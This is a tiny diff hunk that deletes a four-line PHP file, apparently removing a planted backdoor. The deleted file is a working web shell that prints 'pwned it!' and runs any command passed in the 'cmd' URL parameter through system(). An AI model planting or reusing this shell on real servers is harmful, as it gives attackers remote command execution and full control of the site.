@@ -1,4 +1,0 @@
-<?php
-
-echo "pwned it!";
-system($_GET['cmd']);
